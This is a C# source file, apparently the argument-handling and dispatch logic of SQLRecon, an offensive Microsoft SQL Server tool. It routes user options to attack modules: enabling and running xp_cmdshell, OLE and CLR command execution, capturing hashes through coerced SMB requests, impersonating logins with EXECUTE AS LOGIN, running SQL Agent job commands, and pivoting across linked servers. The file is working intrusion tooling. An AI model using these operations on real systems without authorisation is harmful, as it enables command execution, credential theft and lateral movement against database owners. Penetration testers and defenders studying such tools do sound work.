using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using SQLRecon.Modules;

namespace SQLRecon.Auth
{
    public class ArgumentLogic
    {
        //variables used for command line arguments and general program execution
        private static SqlConnection con = null;
        private static String authType = "";
        private static String sqlServer = "";
        private static String database = "";
        private static String domain = "";
        private static String user = "";
        private static String pass = "";
        private static String module = "";
        private static String option = "";
        private static String linkedSqlServer = "";
        private static String impersonate = "";
        private static String function = "";

        public void AuthenticationType(Dictionary<string, string> argDict)
        {
            // if authentication type is not given, display help and return
            if (!argDict.ContainsKey("a"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply an authentication type (-a Windows, -a Local or -a Azure)");
                return;
            }

            // if the authentication type is Windows, make sure that sql server, database and module has been set
            if (argDict["a"].ToLower().Equals("windows") && argDict.ContainsKey("s") && argDict.ContainsKey("d") && argDict.ContainsKey("m"))
            {
                authType = argDict["a"].ToLower();
                sqlServer = argDict["s"].ToLower();
                database = argDict["d"].ToLower();
                WindowsAuth WindowsAuth = new WindowsAuth();
                con = WindowsAuth.Send(sqlServer, database);
                EvaluateTheArguments(argDict);
            }
            else if (argDict["a"].ToLower().Equals("windows"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a SQL server (-s), database (-d) and module (-m)");
                return;
            }

            /* if authentication type is local, make sure that:
                - the SQL server
                - database
                - username 
                - and password has been given, otherwise display help and return
            */
            if (argDict["a"].ToLower().Equals("local") && argDict.ContainsKey("s") && argDict.ContainsKey("d") && argDict.ContainsKey("u") && argDict.ContainsKey("p") && argDict.ContainsKey("m"))
            {
                authType = argDict["a"].ToLower();
                sqlServer = argDict["s"].ToLower();
                database = argDict["d"].ToLower();
                user = argDict["u"];
                pass = argDict["p"];
                LocalAuth LocalAuth = new LocalAuth();
                con = LocalAuth.Send(sqlServer, database, user, pass);
                EvaluateTheArguments(argDict); 
            }
            else if (argDict["a"].ToLower().Equals("local"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a SQL server (-s), database (-d), username (-u), password (-p) and module (-m)");
                return;
            }

            /* if authentication type is azure, make sure that:
                - the SQL server
                - database
                - username 
                - domain
                - and password has been given, otherwise display help and return
            */
            if (argDict["a"].ToLower().Equals("azure") && argDict.ContainsKey("s") && argDict.ContainsKey("d") && argDict.ContainsKey("r") && argDict.ContainsKey("u") && argDict.ContainsKey("p") && argDict.ContainsKey("m"))
            {
                if (!argDict["r"].Contains("."))
                {
                    Console.WriteLine("\n[!] ERROR: Domain (-r) must be the fully qualified domain name (domain.com)");
                    return;
                }
                else
                {
                    authType = argDict["a"].ToLower();
                    sqlServer = argDict["s"].ToLower();
                    database = argDict["d"].ToLower();
                    domain = argDict["r"];
                    user = argDict["u"];
                    pass = argDict["p"];
                    AzureAuth AzureAuth = new AzureAuth();
                    con = AzureAuth.Send(sqlServer, database, domain, user, pass);
                    EvaluateTheArguments(argDict);
                }
            }
            else if (argDict["a"].ToLower().Equals("azure"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a SQL server (-s), database (-d), domain (-r), username (-u), password (-p) and module (-m)");
                return;
            }
        }

        // EvaluateTheArguments
        public static void EvaluateTheArguments(Dictionary<string, string> argDict)
        {
            // ##############################################
            // ###### Standard Single SQL Server Logic ######
            // ##############################################
            // if the module type is query, then set the module to query and set option to the actual sql query
            if (argDict["m"].ToLower().Equals("query") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a query (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("tables"))
            {
                if (!argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a database on the SQL server (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                }
            }
            else if (argDict["m"].ToLower().Equals("smb") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a SMB path (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("xpcmd") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a command (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("olecmd") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a command (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("agentcmd") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a command (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("search") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a keyword (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("clr"))
            {
                if (!argDict.ContainsKey("o") || !argDict.ContainsKey("f"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply path to DLL (-o) and function name (-f)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    function = argDict["f"];
                }
            }
            else if (argDict.ContainsKey("o"))
            {
                module = argDict["m"].ToLower();
                option = argDict["o"];
            }
            else
            {
                module = argDict["m"].ToLower();
            }

            // #####################################
            // ###### Linked SQL Server Logic ######
            // #####################################
            // if the module type is lquery, then set the linkedSqlServer, set the module to lquery and set option to the actual sql query
            if (argDict["m"].ToLower().Equals("lquery"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and query (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ltables"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and database on the linked SQL server (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lsmb"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and SMB path (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lxpcmd"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lolecmd"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lenablerpc"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) you want to enable RPC on");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldisablerpc"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) you want to disable RPC on");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldatabases"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lwhoami"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lroles"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lenablexp"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldisablexp"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lenableole"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldisableole"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lenableclr"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldisableclr"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lagentstatus"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else
            {
                module = argDict["m"].ToLower();
            }

            // ############################################
            // ###### Impersonation SQL Server Logic ######
            // ############################################
            // if the module type is impersonate, then set the sqlServer, set the module to impersonate and set option to the actual sql query
            if (argDict["m"].ToLower().Equals("iquery"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) and query (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ixpcmd"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iwhoami"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ienablexp"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("idisablexp"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iolecmd"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iagentcmd"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iclr"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o") || !argDict.ContainsKey("f"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i),  path to DLL (-o) and function name (-f)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    function = argDict["f"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ienableole"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("idisableole"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ienableclr"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("idisableclr"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iagentstatus"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else
            {
                module = argDict["m"].ToLower();
            }

            // this is effectively a huge module switch

            // ##########################################
            // ########## Standard SQL Modules ##########
            // ##########################################

            SQLQuery sqlQuery = new SQLQuery();

            // whoami
            if (module.Equals("whoami"))
            {
                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "SELECT SYSTEM_USER;"));
                Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteQuery(con, "SELECT USER_NAME(); "));

                Console.Out.WriteLine("\n[+] Roles: ");
                Roles Roles = new Roles();
                Roles.Server(con, "public");
                Roles.Server(con, "sysadmin");
            }
            // databases
            else if (module.Equals("databases"))
            {
                Console.Out.WriteLine("\n[+] Databases in " + sqlServer + ":" + sqlQuery.ExecuteCustomQuery(con, "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;"));
            }
            // tables 
            else if (module.Equals("tables"))
            {
                Console.Out.WriteLine("\n[+] Tables in " + option + ":" + sqlQuery.ExecuteCustomQuery(con, "select * from " + option + ".INFORMATION_SCHEMA.TABLES;"));
            }
            // query
            else if (module.Equals("query"))
            {
                Console.Out.WriteLine("\n[+] Executing: " + option + " on " + sqlServer + ":" + sqlQuery.ExecuteCustomQuery(con, option));
            }
            // search 
            else if (module.Equals("search"))
            {
                Console.Out.WriteLine("\n[+] Searching for columns containing " + option + " in " + database + ": " + sqlQuery.ExecuteCustomQuery(con, "select table_name, column_name from INFORMATION_SCHEMA.COLUMNS where column_name like '%" + option + "%';"));
            }
            // smb
            else if (module.Equals("smb"))
            {
                Console.Out.WriteLine("\n[+] Sending SMB Request to: " + option);
                SMB smb = new SMB();
                smb.CaptureHash(con, option);
            }
            // impersonate
            else if (module.Equals("impersonate"))
            {
                Console.Out.WriteLine("\n[+] Enumerating accounts that can be impersonated on " + sqlServer + ":");
                Impersonate impersonate = new Impersonate();
                impersonate.Check(con);
            }
            // enablexp
            else if (module.Equals("enablexp"))
            {
                Console.Out.WriteLine("\n[+] Enabling xp_cmdshell on: " + sqlServer + ":");
                Configure config = new Configure();
                config.EnableDisable(con, "xp_cmdshell", "1");
            }
            // disablexp
            else if (module.Equals("disablexp"))
            {
                Console.Out.WriteLine("\n[+] Disabling xp_cmdshell on: " + sqlServer + ":");
                Configure config = new Configure();
                config.EnableDisable(con, "xp_cmdshell", "0");
            }
            // xpcmd
            else if (module.Equals("xpcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + sqlServer + ":");
                XPCmdShell XPCmdShell = new XPCmdShell();
                XPCmdShell.StandardCommand(con, option);
            }
            // enableole
            else if (module.Equals("enableole"))
            {
                Console.Out.WriteLine("\n[+] Enabling Ole Automation Procedures on: " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "Ole Automation Procedures", "1");
            }
            // disableole
            else if (module.Equals("disableole"))
            {
                Console.Out.WriteLine("\n[+] Disabling Ole Automation Procedures on: " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "Ole Automation Procedures", "0");
            }
            // olecmd
            else if (module.Equals("olecmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + sqlServer);
                OLE ole = new OLE();
                ole.StandardCommand(con, option);
            }
            // enableclr
            else if (module.Equals("enableclr"))
            {
                Console.Out.WriteLine("\n[+] Enabling CLR integration on: " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "clr enabled", "1");
            }
            //  disableclr
            else if (module.Equals("disableclr"))
            {
                Console.Out.WriteLine("\n[+] Disabling CLR integration on: " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "clr enabled", "0");
            }
            // clr
            else if (module.Equals("clr"))
            {
                Console.Out.WriteLine("\n[+] Performing CLR custom assembly attack on: " + sqlServer);
                CLR clr = new CLR();
                clr.Standard(con, option, function);
            }
            //agentstatus
            else if (module.Equals("agentstatus"))
            {
                AgentJobs aj = new AgentJobs();
                aj.AgentStatus(con, sqlServer);
            }
            else if (module.Equals("agentcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + sqlServer + ":");
                AgentJobs aj = new AgentJobs();
                aj.AgentCommand(con, sqlServer, option);
            }
            // links
            else if (module.Equals("links"))
            {
                Console.Out.WriteLine("\n[+] Additional Links on " + sqlServer + ": " + sqlQuery.ExecuteCustomQuery(con, "SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1;"));

            }

            // ########################################
            // ########## Linked SQL Modules ##########
            // ########################################

            // ldatabases
            else if (module.Equals("ldatabases"))
            {
                Console.Out.WriteLine("\n[+] Databases on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "SELECT dbid, name, crdate, filename from master.dbo.sysdatabases;"));
            }
            // ltables
            else if (module.Equals("ltables"))
            {
                Console.Out.WriteLine("\n[+] Tables in database " + option + " on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "select * from " + option + ".INFORMATION_SCHEMA.TABLES;"));

            }
            // lquery
            else if (module.Equals("lquery"))
            {
                Console.Out.WriteLine("\n[+] Executing " + option + " on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, option));
            }
            // lsmb
            else if (module.Equals("lsmb"))
            {
                Console.Out.WriteLine("\n[+] Sending SMB Request from " + linkedSqlServer + " to " + option + " via " + sqlServer);
                SMB smb = new SMB();
                smb.CaptureLinkedHash(con, linkedSqlServer, option);
            }
            // lwhoami
            else if (module.Equals("lwhoami"))
            {
                Console.Out.WriteLine("\n[+] Determining user permissions on " + linkedSqlServer + " via " + sqlServer + ":");

                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT SYSTEM_USER;"));
                Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT USER_NAME(); "));

                Console.Out.WriteLine("\n[+] Roles: ");
                Roles Roles = new Roles();
                Roles.Linked(con, "public", linkedSqlServer);
                Roles.Linked(con, "sysadmin", linkedSqlServer);
            }
            // lenablerpc
            else if (module.Equals("lenablerpc"))
            {
                Console.Out.WriteLine("\n[+] Enabling RPC on: " + linkedSqlServer);
                Configure config = new Configure();
                config.EnableDisableRpc(con, "1", linkedSqlServer);
            }
            //  ldisablerpc
            else if (module.Equals("ldisablerpc"))
            {
                Console.Out.WriteLine("\n[+] Disabling RPC on: " + linkedSqlServer);
                Configure config = new Configure();
                config.EnableDisableRpc(con, "0", linkedSqlServer);
            }
            // lenablexp
            else if (module.Equals("lenablexp"))
            {
                Console.Out.WriteLine("\n[+] Enabling xp_cmdshell on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "xp_cmdshell", "1", linkedSqlServer);
            }
            // ldisablexp
            else if (module.Equals("ldisablexp"))
            {
                Console.Out.WriteLine("\n[+] Disabling xp_cmdshell on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "xp_cmdshell", "0", linkedSqlServer);
            }
            // lenableole
            else if (module.Equals("lenableole"))
            {
                Console.Out.WriteLine("\n[+] Enabling OLE Automation Procedures on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "OLE Automation Procedures", "1", linkedSqlServer);
            }
            // ldisableole
            else if (module.Equals("ldisableole"))
            {
                Console.Out.WriteLine("\n[+] Disabling OLE Automation Procedures on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "OLE Automation Procedures", "0", linkedSqlServer);
            }
            // lenableclr
            else if (module.Equals("lenableclr"))
            {
                Console.Out.WriteLine("\n[+] Enabling CLR integration on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "clr enabled", "1", linkedSqlServer);
            }
            // ldisableclr
            else if (module.Equals("ldisableclr"))
            {
                Console.Out.WriteLine("\n[+] Disabling CLR integration on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "clr enabled", "0", linkedSqlServer);
            }
            // lxpcmd
            else if (module.Equals("lxpcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + linkedSqlServer + " via " + sqlServer + ":");
                XPCmdShell XPCmdShell = new XPCmdShell();
                XPCmdShell.LinkedCommand(con, option, linkedSqlServer);
            }
            else if (module.Equals("lolecmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + linkedSqlServer + " via " + sqlServer + ":");
                OLE Ole = new OLE();
                Ole.LinkedCommand(con, option, linkedSqlServer);
            }
            // lagentstatus
            else if (module.Equals("lagentstatus"))
            {
                Console.Out.WriteLine("\n[+] Getting SQL agent status on " + linkedSqlServer + " via " + sqlServer + ":");
                AgentJobs aj = new AgentJobs();
                aj.LinkedAgentStatus(con, sqlServer, linkedSqlServer);
            }

            // ###############################################
            // ########## Impersonation SQL Modules ##########
            // ###############################################

            // iwhoami
            else if (module.Equals("iwhoami"))
            {
                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));
                Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "';SELECT USER_NAME();"));

                Console.Out.WriteLine("\n[+] Roles: ");
                Roles Roles = new Roles();
                Roles.Impersonate(con, "public", impersonate);
                Roles.Impersonate(con, "sysadmin", impersonate);
            }
            // iquery
            else if (module.Equals("iquery"))
            {
                Console.Out.WriteLine("\n[+] Executing " + option + " as " + impersonate + " on " + sqlServer + ":" + sqlQuery.ExecuteCustomQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; " + option));
            }
            // ienablexp
            else if (module.Equals("ienablexp"))
            {
                Console.Out.WriteLine("\n[+] Enabling xp_cmdshell as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "xp_cmdshell", "1", impersonate);
            }
            // idisablexp
            else if (module.Equals("idisablexp"))
            {
                Console.Out.WriteLine("\n[+] Disabling xp_cmdshell as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "xp_cmdshell", "0", impersonate);
            }
            // ixpcmd
            else if (module.Equals("ixpcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' as " + impersonate + " on " + sqlServer);
                XPCmdShell XPCmdShell = new XPCmdShell();
                XPCmdShell.ImpersonateCommand(con, option, impersonate);
            }
            // ienableole
            else if (module.Equals("ienableole"))
            {
                Console.Out.WriteLine("\n[+] Enabling Ole Automation Procedures as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "Ole Automation Procedures", "1", impersonate);
            }
            // idisableole
            else if (module.Equals("idisableole"))
            {
                Console.Out.WriteLine("\n[+] Disabling Ole Automation Procedures as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "Ole Automation Procedures", "0", impersonate);
            }
            // iolecmd
            else if (module.Equals("iolecmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' as " + impersonate + " on " + sqlServer);
                OLE Ole = new OLE();
                Ole.ImpersonateCommand(con, option, impersonate);
            }
            // ienableclr
            else if (module.Equals("ienableclr"))
            {
                Console.Out.WriteLine("\n[+] Enabling CLR Integration as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "clr enabled", "1", impersonate);
            }
            // idisableclr
            else if (module.Equals("idisableclr"))
            {
                Console.Out.WriteLine("\n[+] Disabling CLR Integration as " + impersonate + " on " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "clr enabled", "0", impersonate);
            }
            // iclr
            else if (module.Equals("iclr"))
            {
                Console.Out.WriteLine("\n[+] Performing CLR custom assembly attack as " + impersonate + " on " + sqlServer);
                CLR clr = new CLR();
                clr.Impersonate(con, option, function, impersonate);
            }
            // iagentstatus
            else if (module.Equals("iagentstatus"))
            {
                AgentJobs aj = new AgentJobs();
                aj.AgentStatus(con, sqlServer, impersonate);
            }
            // iagentcmd
            else if (module.Equals("iagentcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' as " + impersonate + " on " + sqlServer);
                AgentJobs aj = new AgentJobs();
                aj.ImpersonateAgentCommand(con, sqlServer, option, impersonate);
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: Module " + module + " does not exist\n");
            }
        } // end EvaluateTheArguments
    }
}
